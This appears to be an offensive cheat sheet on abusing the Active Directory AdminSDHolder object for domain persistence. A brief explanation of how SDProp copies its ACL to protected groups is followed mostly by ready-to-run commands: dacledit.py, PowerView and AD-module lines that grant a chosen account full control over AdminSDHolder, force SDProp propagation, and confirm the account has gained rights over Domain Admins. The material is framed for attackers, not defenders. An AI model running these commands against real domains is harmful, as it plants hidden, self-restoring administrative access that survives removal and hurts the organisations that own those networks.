# AdminSDHolder

## Permissions: Domain Admin

### The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

### If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.

### Once sufficient privileges are obtained, attackers can abuse AdminSdHolder to get persistence on the domain by modifying the AdminSdHolder object's DACL. 

## Linux

    dacledit.py -action write -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'administrator':'password'

### Inspection

    dacledit.py -action read -target "Domain Admins" -principal user1 -dc-ip <DC_IP> domain.local/user1:password

## Windows

    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All

##### PowerView

    Add-ObjectAcl -TargetSearchBase 'CN=AdminSDHolder,CN=System' -PrincipalIdentity user1 -Rights All -Verbose

##### AD Module

    Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Principal user1 -Verbose

Run SDProp manually

    Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

##### Pre-Server 2008

    Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose


OR

Then wait for SDProp process to run. It may take up to 60 minutes. After waiting, run the command below to inspect if the user has been added as a domain admin

### Inspection

    Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs

##### PowerView

    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}

##### AD Module

    (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'user1'}

